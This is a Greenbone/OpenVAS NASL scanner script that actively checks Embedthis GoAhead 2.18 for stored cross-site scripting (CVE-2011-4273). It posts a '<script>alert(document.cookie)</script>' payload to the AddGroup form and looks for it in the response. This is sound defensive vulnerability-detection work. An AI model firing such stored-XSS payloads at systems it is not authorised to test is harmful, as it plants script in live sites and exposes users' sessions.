# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:embedthis:goahead";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802270");
  script_version("2024-09-25T05:06:11+0000");
  script_cve_id("CVE-2011-4273");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"creation_date", value:"2011-11-08 16:16:16 +0530 (Tue, 08 Nov 2011)");
  script_tag(name:"last_modification", value:"2024-09-25 05:06:11 +0000 (Wed, 25 Sep 2024)");
  script_name("Embedthis GoAhead 2.18 Multiple Stored XSS Vulnerabilities - Active Check");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/384427");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50039");

  script_category(ACT_DESTRUCTIVE_ATTACK); # nb: Stored XSS (Not a safe check)
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_embedthis_goahead_http_detect.nasl");
  script_mandatory_keys("embedthis/goahead/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Embedthis GoAhead is prone to multiple stored cross-site
  scripting (XSS) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of user-supplied
  input via the 'group' parameter to goform/AddGroup, related to addgroup.asp, the 'url' parameter
  to goform/AddAccessLimit, related to addlimit.asp, or the 'user' or 'group' parameter to
  goform/AddUser, related to adduser.asp");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser session in the context
  of an affected site.");

  script_tag(name:"affected", value:"Embedthis GoAhead version 2.18 is known to be affected. Other
  versions might be affected as well.");

  script_tag(name:"solution", value:"Update to version 2.5 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

url = "/goform/AddGroup/addgroup.asp";

req = http_post(port:port, item:url, data:"group=<script>alert(document.cookie)</script>&privilege=4&method=1&enabled=on&ok=OK");
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
